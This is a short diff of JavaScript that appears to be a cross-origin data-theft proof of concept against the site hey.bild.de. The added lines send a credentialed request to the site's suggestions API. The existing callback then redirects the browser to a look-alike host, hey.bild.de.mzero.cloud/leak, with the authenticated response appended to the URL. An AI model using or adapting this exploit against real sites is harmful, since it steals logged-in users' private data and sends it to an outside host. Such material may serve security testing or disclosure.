@@ -11,6 +11,13 @@
     console.log(req);
     req.send();
 
+    var req = new XMLHttpRequest();
+    req.onload = reqListener;
+    req.open('get','https://hey.bild.de/api/suggestions',true);
+    req.withCredentials = true;
+    console.log(req);
+    req.send();
+
     function reqListener() {
     	location='//hey.bild.de.mzero.cloud/leak"?key='+this.responseText;
     };
